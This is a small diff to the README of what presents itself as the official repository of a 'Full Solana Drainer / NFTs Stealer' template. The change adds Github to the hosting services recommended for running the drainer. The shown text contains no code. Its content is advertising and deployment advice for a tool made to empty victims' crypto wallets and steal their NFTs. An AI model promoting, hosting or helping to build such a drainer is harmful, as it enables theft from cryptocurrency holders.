@@ -1,5 +1,5 @@
 # **🧙🏼 Welcome!** *Beware of [scams](https://github.com/captaingreem/Skid-Scammers-list), this is the official repo*
-### 📩 Like **all Drainers** you need to host to make it work (recommended: Hostinger, Netlify, Vercel)
+### 📩 Like **all Drainers** you need to host to make it work (recommended: Hostinger, Netlify, Vercel, Github...)
 
 ---
 ## 🎁 Full Solana Drainer / NFTs Stealer / V1.0 Drainer Template
